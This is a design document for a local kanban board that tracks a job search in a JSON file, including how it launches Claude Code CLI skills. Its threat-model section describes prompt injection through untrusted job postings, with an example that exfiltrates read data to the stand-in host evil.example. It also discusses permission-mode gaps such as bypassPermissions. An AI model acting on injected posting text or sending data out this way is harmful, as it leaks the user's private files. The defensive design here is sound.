# Product

<!-- impeccable:product-schema 1 -->

## Platform

web

## Users

One person, running the board locally on their own machine while job searching.
Two situations, equally weighted:

- **Triage.** A scrape has just dumped new postings in. They read a card, decide
  apply or skip, and keep the queue moving. Volume is high — `skipped` grows
  fastest of any column — so cards are read in fast vertical passes.
- **Pipeline tracking.** A handful of live applications sit in `applied →
  screening → tech_interview → final_round → offer`. Few cards, each one consequential; what
  matters is what stage it is in, how long it has been there, and what they wrote
  down about it.

Evening and after-hours use is normal — job searching happens around a job — on a
laptop, in a room with the lights on.

## Product Purpose

A kanban view over `data/jobs.json`. Dragging a card between columns
rewrites that entry's `status` in the file; notes typed on a card are saved to
the same entry. The JSON stays the single source of truth so the `/scrape` and
`/rank` skills keep working unchanged. Success is that the board is faster to
triage in than the raw JSON and never corrupts it.

## Positioning

Not a hosted tracker. There is no database and no account: the board is a view
onto a file that other tooling in the same repo already reads and writes, and
`git diff data/jobs.json` is the undo. That round-trip is the whole
point — a SaaS tracker cannot be the input to `/rank`.

## Operating Context

- Runs only under `bun run dev`. `server/jobs-api.ts` is a Vite plugin mounting
  `GET /api/jobs` and `PATCH /api/jobs` on the dev server; `bun run build`
  produces a bundle with no write path.
- Bound to localhost deliberately. The file holds the user's own job-search data.
- Nine columns: `new → ranked → applied → screening → tech_interview → final_round → offer`,
  then the dead ends `rejected` and `skipped`. The first six are visible by
  default; an unrecognised status shows under New.
- **`rejected` is every way an application ends without an offer**, and *which* way
  is a multi-select `outcome` field rather than a column: `ghosted`, `withdrawn`,
  `on_hold`, `failed_screening`, `failed_tech`, `failed_behavioural`. They combine,
  because the real cases combine — one entry went quiet *after* the technical
  interview, and that is `["ghosted", "failed_tech"]`, which three separate columns
  could not have said. No tag means they simply said no; there is deliberately no
  tag for that, since an explicit one could be ticked next to `ghosted` and
  contradict it.
- `ghosted` and `withdrawn` were columns until the collapse: in practice one
  enormous column and two thin ones that still could not express a combination. They stay readable as statuses — the
  tracker and the CLI skills can still emit them, and both are translated on read
  and on write, or a dead application would reappear at the top of New.
- **`skipped` is every way a posting is not applied to**, and it has one column:
  `/rank` passing it over (sentence in `excluded_reason`), the user overruling a
  score (reason required, stored in `notes`), or the posting closing. `dismissed`
  and `expired` are still written by older board versions and by `/rank`, and both
  fold into Skipped on read — three columns for one answer was three places to
  look, and the difference lives in the sentence rather than the column. `/rank` never
  re-scores a skipped entry, so the board is where a ranking gets vetoed.
- Sits inside a private repo alongside the `/scrape`, `/rank`, `/apply` and
  `/outcome` skills that produce and consume the same entries.

## Capabilities and Constraints

- `PATCH` assigns `status`, `notes`, `duplicate_of` and `outcome`, plus the
  `status_date` stamp that follows a status change, plus the descriptive fields the
  edit dialog owns: `title`, `company`, `url`, `work_mode`, `salary` and
  `applied_date`. Every other field on an entry (`rank_score`, `rank_verdict`,
  `rank_dimensions`, `portal`, `fit`, `first_seen`, `rank_deadline`,
  `rank_location`) is carried through untouched because `/rank` depends on them.
- Five fields are the board's and no other tool writes them: `next_id` at the file
  root, and `id`, `status_date`, `applied_date` and `duplicate_of` on an entry. `GET` repairs the
  first two — it backfills any missing `id` in `first_seen` order and links
  postings whose URLs are identical once tracking parameters and locale prefixes
  come off. Both passes are idempotent, so a `GET` that finds nothing to do writes
  nothing.
- `id` is the handle the user names a posting by (`#153`), so it is assigned once,
  never reused and never renumbered. A duplicate keeps its own integer `id` and
  points at its canonical through `duplicate_of`; the `#153B` reading on a copy is
  derived from group order at render time, never stored, so re-electing a canonical
  cannot renumber anything.
- The weaker duplicate signal — same company and title under different URLs — is
  only ever a suggestion. One employer in the data ran the same role in two cities,
  so a confirmation step stands between detection and hiding, and the negative answer is
  written too: `duplicate_of: null` means "checked, standalone", which is why absent
  and `null` are distinct states.
- Writes are serialised, atomic (temp file then `rename`), and 2-space indented
  to match what `/scrape` writes, so a status change is a one-line git diff.
- Card order within a column is **not** persisted — `data/jobs.json` has no
  ordering field. Per-column sort and column visibility are view state in
  `localStorage`.
- Columns render 25 cards at a time behind a "show more" button.
- **The detail panel is one layout for every entry.** A missing value reads as `—`
  rather than closing the gap: a panel that drops what an entry lacks is a
  different panel per card, and then nothing is ever where it was last time. What
  varies by stage is which *sections* apply — outcome tags only under Rejected —
  not where a value sits.
- **Two readings of an entry, one set of components.** The popover is triage: four
  lines, a decision, the next card. The job page is the other job the board does —
  a live application, few of them, each consequential — and it holds what a 25rem
  popover cannot: the job description itself, and the documents written for that
  application. The rail beside the description is the same `job-details` components
  the popover renders, so a value cannot read one way in one place and another way
  in the other. The page is reached from a card, never from the app rail: it is one
  entry, and a nav key that does nothing until you have picked a posting is a dead
  key four times out of five.
- **The description is read from the file, not from the entry.** `posting_file`
  points into `documents/postings/`, and the page fetches it. Moving the text into
  `data/jobs.json` would put ten kilobytes of employer prose per entry into the
  file every CLI skill parses and `git diff` reviews.
- **Documents are found through `application_dir`, never through a guessed slug.**
  `/apply`, `/outcome` and `/research` set that field when they create the folder.
  Rebuilding the folder name here out of company and title disagrees with what the
  skill wrote the first time a company name has a dot in it, and the failure is
  silent: an empty panel on an application that has four documents.
- **The panel reads, the dialog writes.** What the posting *says* is a fact the
  user can correct better than any scraper — title, company, URL, work mode,
  salary, location, applied, apply deadline, posted, first seen, portal, stage —
  and from the popover all of it is editable behind one **Edit posting** button
  rather than by clicking into the reading. A panel where every value is also a
  control has no resting state. What `/rank` *concluded* is not editable at all: the score, the
  verdict and the four-axis breakdown are the one thing the user cannot reproduce
  by hand, and a board that lets you type over a score is a board whose scores mean
  nothing. `excluded_reason` is read-only on the same principle: it is the
  scrapers' sentence, and `notes` is the user's.
- **The apply deadline is intake-only.** Once an application is out, when
  applications closed cannot change anything the user does, and a lapsed date
  beside a live process reads as bad news about the process.
- **A rejected entry leads with its outcome**, then stage, then notes, with the
  details below. How it ended is what a dead entry is opened for; the score is what
  it was before it died. Everywhere else the details lead, because the open
  question there is still whether to apply.
- **"In stage" is a wait, not an event**, and it carries the date it counts from.
  The stage word is left out: with it, a card dragged into Tech interview this
  morning read "interview today", which is a scheduled interview rather than a
  zero-day wait. The column already names the stage.
- **Rejected asks how it ended**, on every route in. The tags and an optional note
  go in with the status in one PATCH, and nothing ticked is the real answer "they
  said no" rather than an unanswered prompt.
- **The entry page writes in place**, and it is the one surface that does. The rule
  above is about a popover glanced at during triage; the page is opened because that
  one application *is* the work, and being sent to a dialog to fix a salary you are
  looking at is the cost that rule was never meant to buy. The resting state is kept
  by making the affordance the track's rather than the field's: nothing is outlined
  until the pointer is in the block, and then every editable value picks up the same
  dashed rule at once. Where there is no hover to reveal it — a touch screen — the
  rule is simply there, quieter. `rank_*`, `fit` and `excluded_reason` stay read-only
  on the page too; that half of the rule is not about which surface you are on.
- **A stage date is corrected on the log row that states it**, never inside a rail
  chevron: the rail is a reading and a stage control at once, and a value that is
  also a date picker inside a button is neither.
- **`notes` carries a dated log, and the page renders it as one.** Nothing in the
  file logs events, so the running record of a live application goes into the note by
  hand as `3 Jul: Screening` lines. Those are parsed back out and mixed with the
  dates the entry already carries, so the hand-written story and the recorded stages
  read as one sequence. No new field: every write rewrites a single line of `notes`
  and leaves the rest byte for byte, so the CLI skills read what they always read and
  a log entry is still a one-line diff. The year nobody writes down is inferred from
  the sequence — the log is kept append-only, so each entry takes the earliest year
  that keeps it on or after the one above it.
- **A date ahead of today is a booking, not a wait.** Every reading in `dates.ts`
  returns null for a future date rather than printing a negative age, so the entry
  page splits those events off above a `now` rule instead of dropping them. What is
  booked next is the most consequential thing on a live application.
- **The rail keeps every stage; the run keeps only what happened.** `buildStages`
  draws all seven slots so a missing date is visible as the thing worth filling in,
  and `buildTimeline` leaves an undated stage out so nothing is interpolated. Two
  readings of one set of dates, and the difference is deliberate.
- **The description is read over the page, not as the page.** A JD is three thousand
  words: set in the body it *is* the body, and everything the page exists to answer
  ends up below it. It opens in the reading modal along with the CV, the prep and the
  research, which is the one place this app sets prose.
- A card has four ways to change stage (drag, popover picker, right-click submenu,
  the entry page's rail) and they all write the same field. The right-click menu is
  also where copy-to-clipboard and the dismissal live.
- ⌘/Ctrl-click and ⇧-click select cards; a batch move or dismissal is one
  request and one file write, all-or-nothing. Capped at 500 entries.
- `rank_location` holds the place the posting states, not a verdict on it. `/rank`
  is reading the posting anyway, and `PASS` throws away the one part of that reading
  the user cannot reconstruct. The veto the verdict drove still happens at rank time
  and its consequences still persist — a location `FAIL` lands as `skipped` with the
  reason in `excluded_reason` — so nothing is lost by not storing the word. Entries
  ranked before the change still carry `PASS`/`FLAG`/`FAIL`, and the board drops
  those on read rather than translating them: "checked — no problem" held the
  location line without answering where the job was. They are not re-ranked to
  backfill, since re-reading 113 postings to replace one word is not worth it.
- Work mode on a hand-added posting is a five-rung slider, onsite to remote, not a
  text field: the answer is one of five things every time and typing it was the
  slowest part of the form. Unset is a distinct state rather than defaulting to the
  middle — a posting whose mode you do not know must not end up claiming Hybrid.
- `POST` adds a posting the portal CLIs never saw — the recruiter-DM case, which
  the tracker calibration names as the converting channel. It writes
  a short allowlist of fields and cannot set `fit` or any `rank_*` value, so a
  hand-added entry carries no score until `/rank` reads the posting itself.
- Drag is native HTML5, not a drag library: with ~90 cards mounted, dnd-kit
  re-rendered every card on every pointer move. React renders nothing between
  `dragstart` and `drop`, and that constraint is load-bearing — drag affordance
  is set as DOM attributes by `src/lib/drag-state.ts`, never as React state.
- Trade-off accepted for that: Playwright's `dragTo` cannot drive native HTML5
  drag, so an end-to-end drag test must dispatch `DragEvent`s by hand.
- No entry deletion, and no editing of `fit` or any `rank_*` value — those are
  `/scrape`'s and `/rank`'s conclusions. What a posting *says* is editable by hand
  (company, title, URL, remote days, salary, applied date), because a typo in a
  hand-added entry otherwise has nowhere to be fixed.
- A live card drops the deadline: how long a posting stays open stops being news
  once the application is out. It reports its wait instead (`applied 6d`), and
  past 21 days in a pre-offer stage that reading lights up, because silence that
  long is the story. Under Applied the hand-set `applied_date` is what it counts
  from — `status_date` can only ever be the day the entry was logged, so an
  application sent three weeks ago would otherwise read as sent today. Entries that
  predate both fall back to `seen MM-DD` rather than claiming today. The deadline is still in the details popover at every
  stage.

## Brand Commitments

None inherited. The neumorphic direction previously pinned here was replaced by
the user in a full redesign, and the constraints below are the standing ones.

- **Near-black, one hue.** Dark is the plate this is designed on; light is
  derived from it and kept. Every neutral runs on a single hue at very low
  chroma, so the whole surface reads as one material.
- **Elevation is lightness.** Three planes in fixed order, each a real lightness
  step, edged with a hairline. Nothing at rest casts a shadow. One shadow exists
  in the build and is spent only on genuinely detached objects — popovers,
  dialogs, the dock, a grabbed card. No bevels, no embossing, no lit edges, no
  glow: those were the thing the redesign removed and they do not come back.
- **shadcn's component grammar, executed at Linear's craft level.** The user
  named Linear as the bar. Standard role tokens and standard component anatomy,
  but not the stock rendition of them: the soft multi-pixel focus halo, the
  roomy marketing spacing and the uniform grey ramp are what "generic" meant.
- **Archivo carries the identity.** Its width axis, run condensed, uppercase and
  tracked, is the one typographic move no component library ships by default and
  the reason the surface stays recognizable with the content removed. Geist for
  every numeral, Source Serif for documents only.
- **The accent is ink and one pixel, never a field.** One accent, spent on
  selection, focus and the drop target. Anything that lights it permanently
  makes those three read as ordinary.
- **One hue is a state, two hues is a passage.** The timeline's colours carry a
  gradient only where the object *is* a move: the card that just landed, the
  dialog that asks about a move, the toast that reports it, the log spine
  between two events, and the strip across the column headers. Never a fill,
  never a neutral, and never the accent — a ramp cannot mark selection, and the
  accent cannot say which two stages a move ran between. A **standing** reading
  keeps its one flat hue: the stage rail was tried as a ramp and eight hues
  blended end to end read as a spectrum, at the cost of a stage still being the
  colour that stage is everywhere else.
- **Density is the design.** This is an instrument for reading a queue in fast
  vertical passes, not a page. Tight radii, tight rhythm, tracks divided by
  rules rather than floating in gutters.

## Running a Skill from the Board

- **The board is a Claude Code client, not a Claude client.** `POST /api/run`
  spawns the local `claude` CLI in the repo root, so a run uses the same
  subscription, the same commands under `.claude/commands/` and the same files
  the terminal does. No API key, no SDK.
- **The client sends a command id, never a prompt.** `run-api.ts` holds the only
  table that turns `{command: "rank", id: 12}` into `/rank #12`. An endpoint
  that forwarded arbitrary text to a CLI with file write access in the repo root
  would be a remote shell with extra steps.
- **A job description is untrusted text, and it goes in the prompt.** So a run is
  a deny-by-default session: `--permission-mode dontAsk` with a hand-written
  `--allowedTools`, writes scoped by path to `documents/**` and
  `data/jobs.json`, and Bash removed outright. The mode flag is load-bearing and
  not decoration: `--allowedTools` only ever *adds*, so on a machine whose user
  settings carry `"defaultMode": "bypassPermissions"` the allowlist restricts
  nothing at all. `dontAsk` refuses anything off the list by rule and reports the
  refusal; `manual`, which stood here first, is an alias for `default` and only
  denied because `-p` has nobody to answer the prompt. `.claude/commands/*.md` is deliberately outside the writable
  paths, because a run that can rewrite the command files can grant itself
  anything on the next one.
- **`WebFetch` stays unscoped, and that is the residual risk.** `/research` and
  `/apply` exist to read employer sites nobody can enumerate in advance, so a
  posting that talks the model into fetching `evil.example/?q=<what it read>` is
  possible. The commands carry the countermeasure in prose; prose is not a
  sandbox.
- **The board offers a command only where it is not already a control.** Bare
  `/outcome` is the case that decided the rule: everything it writes back to an
  entry - the status, the stage dates, the outcome tags - is a control in the
  panel already, so a button for it read as the whole skill being pointless. It
  stays a terminal command, and the board offers only its follow-up branch. What
  the debrief uniquely produces, the `outcome.md` archive and the calibration
  handoff into `/setup`, has no board equivalent and no board shortcut either.
- **One run at a time.** A module-level lock in the server, 409 on collision.
  Two skills writing `data/jobs.json` at once interleave into a file neither
  meant to write.
- **The transcript is working, not a record.** It is thrown away when the panel
  shuts. What a run leaves behind is the file it wrote, which appears under
  Documents on the same page. A kept conversation would be a second,
  unversioned record of an application beside the one in `documents/`.
- **The reply box exists for one reason.** `/apply` stops before it drafts and
  asks whether to go ahead, and a run in `-p` mode has nobody to answer it.
- **The hook is mounted in `App`, not on the job page.** The server kills the
  child when the request closes, so whatever holds the fetch holds the run's
  life. Hung off the page, walking back to the board mid-`/apply` would kill it
  halfway through writing a CV.

## Evidence on Hand

- `../../data/jobs.json` — real tracked data, ~240 KB, the live content
  every screen renders. The file is the fixture; every entry comes from it.
- `README.md` — the measured performance record behind the drag implementation
  (0.005 ms per `dragover`; the 3%-of-the-way-after-one-frame finding). Real
  numbers, worth preserving.

## Product Principles

1. **The file outranks the board.** Any change that risks the JSON's shape or
   its other consumers is not worth a UI win.
2. **Two jobs, one board.** Intake triage wants density and fast rejection;
   pipeline tracking wants detail on few cards. Both are first-class, and the
   card is what adapts.
3. **Page and clamp every column.** Column volume is unbounded, so paging and
   clamping are correctness rather than polish.
4. **Drag stays out of React.** Any affordance added to a drag is CSS on a DOM
   attribute, or it regresses a measured fix.
5. **Local and private.** No remote calls, no analytics, no `--host`.

## Accessibility & Inclusion

No externally imposed standard. Established in the incumbent build and to be
preserved: colour is never the only carrier of fit or state; every icon-only
control has a label and a ≥40px effective hit target; `prefers-reduced-motion`
drops travel while keeping fades.
